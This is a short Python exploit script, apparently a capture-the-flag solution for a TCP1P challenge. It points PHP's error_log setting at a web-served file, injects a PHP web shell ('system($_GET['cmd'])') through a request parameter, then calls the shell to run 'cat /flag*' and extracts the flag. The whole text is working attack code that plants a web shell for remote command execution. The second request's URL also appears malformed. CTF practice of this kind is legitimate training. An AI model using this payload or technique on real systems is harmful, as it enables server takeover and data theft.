import requests
import re

url = 'https://target/'

x = requests.get(url+"?display_errors=1&error_log=/var/www/html/cmd.php&name=<?php%20system($_GET['cmd']);?>")

x = requests.get(url+"cmd.php&cmd=cat /flag*")

print(re.findall(r'TCP1P{.*}',x.text)[0])
